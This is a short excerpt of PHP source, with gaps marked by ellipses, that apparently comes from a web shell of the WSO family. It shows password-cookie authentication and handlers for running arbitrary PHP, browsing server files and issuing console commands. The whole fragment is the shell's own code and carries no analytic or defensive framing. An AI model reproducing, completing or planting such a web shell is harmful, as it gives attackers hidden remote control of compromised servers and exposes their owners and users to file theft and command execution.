...
if(!empty($hash)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $hash))
        SOsetcookie(md5($_SERVER['HTTP_HOST']), $hash);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $hash))
        soLogin();
}
...
function actionPhp() {
    ...
    if(empty($_POST['ajax']) && !empty($_POST['p1']))
        SOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
...
function actionFilesMan() {
	...
	if($dirContent === false) {	echo 'Can\'t open this folder!';soFooter(); return; }
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
...
function actionConsole() {
    if(!empty($_POST['p1']) && !empty($_POST['p2'])) {
        ...
        SOsetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0);
